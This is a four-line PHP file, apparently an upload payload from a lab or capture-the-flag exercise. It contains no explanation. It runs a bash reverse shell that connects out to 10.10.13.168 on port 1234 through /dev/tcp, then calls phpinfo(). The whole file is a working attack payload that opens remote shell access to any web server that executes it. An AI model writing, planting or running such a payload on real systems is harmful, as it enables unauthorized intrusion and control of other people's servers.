<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.13.168/1234 0>&1'");
phpinfo();
?>
